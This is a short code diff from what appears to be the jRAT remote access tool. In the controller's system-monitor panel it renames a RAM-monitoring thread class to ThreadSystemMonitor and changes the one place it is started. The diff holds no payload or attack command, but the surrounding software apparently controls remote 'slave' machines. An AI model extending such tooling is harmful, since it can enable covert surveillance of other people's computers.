@@ -21,7 +21,7 @@ import pro.jrat.Constants;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet74GarbageCollect;
 import pro.jrat.settings.Colors;
-import pro.jrat.threads.ThreadRAM;
+import pro.jrat.threads.ThreadSystemMonitor;
 import pro.jrat.ui.components.JColorBox;
 import pro.jrat.ui.renderers.MemoryMeter;
 
@@ -94,7 +94,7 @@ public class PanelControlSystemMonitor extends PanelControlParent {
 				boolean checked = src.isSelected();
 				if (checked) {
 					needRam = true;
-					new ThreadRAM(sl).start();
+					new ThreadSystemMonitor(sl).start();
 				} else {
 					needRam = false;
 				}
